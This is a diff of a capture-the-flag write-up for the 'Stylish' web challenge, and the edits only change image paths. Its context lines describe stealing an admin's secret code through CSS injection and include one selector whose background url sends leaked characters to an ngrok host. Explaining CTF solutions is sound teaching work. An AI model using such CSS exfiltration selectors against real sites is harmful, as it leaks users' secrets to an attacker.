@@ -22,18 +22,18 @@ color = "green" #color from the theme settings
 # Stylish
 
 ## Challenge description 
-![img](/BCACTF/Pasted_image_20210614000841.png)</br>
+![img](BCACTF/Pasted_image_20210614000841.png)</br>
 Stylish is the one of the hardest challenges at the website and it give us 400 points.
 Organizers give us URL to website and server source code files.  
 
 
 ## Look at the website 
-![img](/BCACTF/Pasted_image_20210613000440.png)</br>
-![img](/BCACTF/Pasted_image_20210613000518.png)</br>
+![img](BCACTF/Pasted_image_20210613000440.png)</br>
+![img](BCACTF/Pasted_image_20210613000518.png)</br>
 Ok so as we can see at website we have got 4 color inputs serialized with JSON and send by GET parameter. By clicking "Submit for review" button we can  send them to admin.    
 But second important thing in our website is "Get flag" button.
 
-![img](/BCACTF/Pasted_image_20210613000448.png)</br>
+![img](BCACTF/Pasted_image_20210613000448.png)</br>
 Our goal in this CTF is steal admin secret code to the flag.
 
 ## Look at the source code 
@@ -133,8 +133,8 @@ button:nth-child(16)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/F")}
 
 
 ### payload sent
-![img](/BCACTF/Pasted_image_20210612234737.png)</br>
+![img](BCACTF/Pasted_image_20210612234737.png)</br>
 Unfortunately my exploit doesn't catch one number (zero) so I had to brute force his position :(
 
-![img](/BCACTF/Pasted_image_20210613000604.png)</br>
+![img](BCACTF/Pasted_image_20210613000604.png)</br>
 After few minute we got the flag.
